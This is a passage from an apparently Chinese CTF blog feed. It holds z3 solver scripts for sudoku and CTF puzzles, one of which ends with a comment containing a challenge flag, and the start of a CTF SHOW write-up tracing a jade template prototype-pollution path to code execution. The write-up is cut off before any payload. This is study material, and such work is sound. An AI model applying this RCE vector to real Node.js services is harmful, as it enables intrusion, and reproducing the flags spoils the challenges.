</span>y &gt; <span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>Or(x + y &gt; <span class="hljs-number">3</span>, x - y &lt; <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><h3 id="取解、解的转化"><a href="#取解、解的转化" class="headerlink" title="取解、解的转化"></a>取解、解的转化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">x, y, z = Reals(<span class="hljs-string">&#x27;x y z&#x27;</span>)<br>s = Solver()<br>s.add(x &gt; <span class="hljs-number">1</span>, y &gt; <span class="hljs-number">1</span>, x + y &gt; <span class="hljs-number">3</span>, z - x &lt; <span class="hljs-number">10</span>)<br><br>s.check()<br>m = s.model()<br><span class="hljs-comment"># 取特定的值</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x = %s&quot;</span> % m[x])<br><br><span class="hljs-comment"># 取出所有的值</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> m.decls():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s = %s&quot;</span> % (d.name(), m[d]))<br>    <br><span class="hljs-comment"># 对于Int，BitVec型可以这样将值转化为python int</span><br>x_int = x.as_long()<br><br><span class="hljs-comment"># 对于Real型可以这样将值转化为python float</span><br>x_float = x.as_decimal(<span class="hljs-number">10</span>) <span class="hljs-comment">#括号中是保留小数位数</span><br></code></pre></td></tr></table></figure><h2 id="4-列表"><a href="#4-列表" class="headerlink" title="4.列表"></a>4.列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个包含五个变量的列表</span><br>X = [ Int(<span class="hljs-string">&#x27;x%s&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br>Y = [ Int(<span class="hljs-string">&#x27;y%s&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br><span class="hljs-built_in">print</span> (X)<br><br><span class="hljs-comment"># 创建一个包含五个运算的列表</span><br>X_plus_Y = [ X[i] + Y[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br><span class="hljs-built_in">print</span> (X_plus_Y)<br><br><span class="hljs-comment"># 创建一个包含五个约束的列表</span><br>X_gt_Y = [ X[i] &gt; Y[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>) ]<br><span class="hljs-built_in">print</span> (X_gt_Y)<br><br><span class="hljs-built_in">print</span> (And(X_gt_Y))<br><br><span class="hljs-comment"># 创建多维的变量</span><br>X = [ [ Int(<span class="hljs-string">&quot;x_%s_%s&quot;</span> % (i+<span class="hljs-number">1</span>, j+<span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ] <br>      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) ]<br>pp(X)<br></code></pre></td></tr></table></figure><h2 id="5-例子"><a href="#5-例子" class="headerlink" title="5.例子"></a>5.例子</h2><h3 id="（1）数独"><a href="#（1）数独" class="headerlink" title="（1）数独"></a>（1）数独</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 创建9*9的列表存储变量</span><br>x = [[Int(<span class="hljs-string">&quot;x_%s_%s&quot;</span> % (i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 对一个变量限定在取值范围</span><br>bounds = [And(<span class="hljs-number">1</span> &lt;= x[i][j], x[i][j] &lt;= <span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 每一行不能有相同元素，Distinct即为添加约束两两不同</span><br>rows = [Distinct(x[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 每一列不能有相同元素</span><br>cols = [Distinct([x[i][j] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># 每一个九宫格不能有相同元素</span><br>sq = [Distinct([x[<span class="hljs-number">3</span> * ii + i][<span class="hljs-number">3</span> * jj + j]<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)])<br>      <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br><br>base_rules = bounds + rows + cols + sq<br><br><span class="hljs-comment"># 数独矩阵，为0的即为没有填的</span><br>instance = ((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),<br>            (<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br><span class="hljs-comment"># 利用If语句将棋盘元素映射为z3类型</span><br>instance_c = [If(instance[i][j] == <span class="hljs-number">0</span>,<br>                 <span class="hljs-literal">True</span>,<br>                 x[i][j] == instance[i][j])<br>              <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br>s = Solver()<br><br>s.add(base_rules + instance_c)<br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    r = [[m.evaluate(x[i][j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>         <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>    print_matrix(r)<br><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failed to solve&quot;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="（2）hackgame2023-小z的谜题"><a href="#（2）hackgame2023-小z的谜题" class="headerlink" title="（2）hackgame2023 小z的谜题"></a>（2）hackgame2023 小z的谜题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><br>bound = <span class="hljs-number">5</span><br>constraints = ((<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))<br>count = [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>num_constraints = <span class="hljs-built_in">sum</span>(count)<br>num_dims = <span class="hljs-built_in">len</span>(constraints[<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># 创建16*3*3的列表存储变量</span><br>arrange = [[[Int(<span class="hljs-string">&#x27;x_%s_%s_%s&#x27;</span> % (k + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br><br>solver = Solver()<br><br><span class="hljs-comment"># Stage 0</span><br><span class="hljs-comment"># 添加约束一</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            <span class="hljs-keyword">if</span> k == <span class="hljs-number">2</span>:<br>                solver.add(arrange[i][j][k] == -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                solver.add(<span class="hljs-number">0</span> &lt;= arrange[i][j][k])<br>                solver.add(arrange[i][j][k] &lt;= bound)<br><br><span class="hljs-comment"># Stage 2</span><br><span class="hljs-comment"># 添加约束二，因为满足其一即可，所以是Or的关系</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> i == j:<br>            <span class="hljs-keyword">continue</span><br>        solver.add(<br>            Or([(Or(arrange[i][k][<span class="hljs-number">1</span>] &lt;= arrange[j][k][<span class="hljs-number">0</span>], arrange[j][k][<span class="hljs-number">1</span>] &lt;= arrange[i][k][<span class="hljs-number">0</span>])) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]))<br><br><span class="hljs-comment"># Stage 3</span><br><span class="hljs-comment"># 添加约束三，这里的核心思想是，只要每一行能够满足其中一个</span><br><span class="hljs-comment"># ((1, 1, 3), (1, 2, 2), (1, 2, 4), (1, 4, 4), (2, 2, 2), (2, 2, 3))</span><br><span class="hljs-comment"># 即可，同时也有数量约束，利用count[t]实现对这此约束</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> count[t]:<br>            g = []<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>(itertools.permutations(constraints[t])):<br>                o = []<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>                    o.append(arrange[i][j][<span class="hljs-number">1</span>] - arrange[i][j][<span class="hljs-number">0</span>] == p[j])<br>                g.append(And(o))<br><br>            solver.add(Or(g))<br>            count[t] -= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br><br><br> <br><span class="hljs-comment"># 计算分数</span><br><span class="hljs-comment"># 这里计算分数方式是每一行能产生多少种笛卡尔积，16行再做累计</span><br><span class="hljs-comment"># 因此只需要每一行的每一种笛卡尔积能够对应所有笛卡尔积中的一种即可</span><br><span class="hljs-comment"># 耗时操作主要就在这一步</span><br>g = []<br><span class="hljs-keyword">for</span> x0, y0, z0 <span class="hljs-keyword">in</span> itertools.product(*([<span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(-<span class="hljs-number">1</span>, bound + <span class="hljs-number">1</span>))] * <span class="hljs-number">3</span>)):<br>    t = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">for</span> x1, y1, z1 <span class="hljs-keyword">in</span> itertools.product(*arrange[i]):<br>            o = [x0 == x1, y0 == y1, z0 == z1]<br>            t.append(And(o))<br>    g.append(Or(t))<br><br><br><span class="hljs-comment"># 统计有多少种笛卡尔积</span><br>s = Sum([If(i, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> g])<br><br><span class="hljs-comment"># 控制分数</span><br>solver.add(s &gt;= <span class="hljs-number">157</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == z3.sat:<br>    ans = solver.model()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>                arrange[i][j][k] = ans[arrange[i][j][k]].as_long()<br><br>    arrange.sort()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(arrange[i][j][k]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_constraints) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_dims) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]))<br><br><span class="hljs-built_in">print</span>(arrange)<br></code></pre></td></tr></table></figure><h3 id="3-FlipGame-脚本"><a href="#3-FlipGame-脚本" class="headerlink" title="(3) FlipGame 脚本"></a>(3) FlipGame 脚本</h3><p>题源强网杯 HappyChess</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>puzzle = <span class="hljs-string">&quot;&quot;&quot;●○○○○○○○●</span><br><span class="hljs-string">●●○●○○○○●</span><br><span class="hljs-string">○○●○●○●○●</span><br><span class="hljs-string">●●●○○○○●○</span><br><span class="hljs-string">●●●○○●○●●</span><br><span class="hljs-string">○●○○●○○●●</span><br><span class="hljs-string">○●○○○○○○●</span><br><span class="hljs-string">●●●●●○●●●</span><br><span class="hljs-string">●○○○●●○○●&quot;&quot;&quot;</span><br>puzzle = puzzle.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>state = [[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> puzzle[i][j] == <span class="hljs-string">&#x27;○&#x27;</span>:<br>            state[i][j] = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            state[i][j] = <span class="hljs-number">0</span><br><br>switches = [[BitVec(<span class="hljs-string">&quot;s_%d_%d&quot;</span> % (i, j), <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)]<br>s = Solver()<br><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        t = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> switches[row][:]:<br>            t ^= p<br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> switches[:][col]:<br>            t ^= p<br>        t ^= switches[row][col]<br>        s.add(t == state[row][col])<br><br>s_list = <span class="hljs-built_in">list</span>()<br><br>final = <span class="hljs-number">0</span><br>temp = <span class="hljs-number">9999999</span><br><br><span class="hljs-keyword">while</span> s.check() == sat:<br>    m = s.model()<br>    s.add(Or([switches[i][j] != m[switches[i][j]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]))<br><br>    summ = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> pp <span class="hljs-keyword">in</span> m:<br>        summ += m[pp].as_long()<br>    <span class="hljs-keyword">if</span> summ &lt; temp <span class="hljs-keyword">and</span> summ != <span class="hljs-number">0</span>:<br>        temp = summ<br>        final = m<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">24</span> &gt; summ &gt; <span class="hljs-number">0</span>:<br>        final = m<br>        <span class="hljs-built_in">print</span>(summ)<br>        <span class="hljs-keyword">break</span><br><br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> final[switches[i][j]].as_long() == <span class="hljs-number">1</span>:<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;(&#123;&#125;,&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(index)<br><span class="hljs-comment"># icq2f196f4f5398cc97a74d8b1032027</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>z3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jade原型链污染RCE</title>
    <link href="/2023/10/24/jade_prototype/"/>
    <url>/2023/10/24/jade_prototype/</url>
    
    <content type="html"><![CDATA[<p>题源CTF SHOW Web342</p><span id="more"></span><h1 id="jade原型链污染RCE"><a href="#jade原型链污染RCE" class="headerlink" title="jade原型链污染RCE"></a>jade原型链污染RCE</h1><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h2><p>下载源码，拖入IDEA，在<code>bin/www.js</code>启动调试，在<code>routes/index.js</code>下断点，然后访问<code>127.0.0.1:3000</code>，触发断点，开始调试</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2011.17.57.png"></p><p>跟入<code>res.render</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.41.35.png"></p><p>继续跟入<code>app.render</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.43.18.png"></p><p>继续跟入<code>tryRender</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.44.01.png"></p><p>继续跟入<code>view.render</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.44.35.png"></p><p>继续跟入<code>this.engine</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.46.15.png"></p><p>继续跟入<code>exports.renderFile</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.47.43.png"></p><p>走一个小递归，然后进入<code>handleTemplateCache</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.48.49.png"></p><p>跟进<code>exports.compile</code>函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E9%8E%B4%EE%81%84%E7%9D%862023-10-24%2012.56.47.png"></p><p>重点关注204行的<code>parse</code>函数，这个函数返回值给<code>parsed</code>，然后<code>parsed</code>拼接进<code>fn</code>，<code>fn</code>再送进218行的<code>Function</code>执行，那么就要想办法让<code>parsed</code>代入我们自己的命令，跟入<code>parse</code>函数</p><p><img 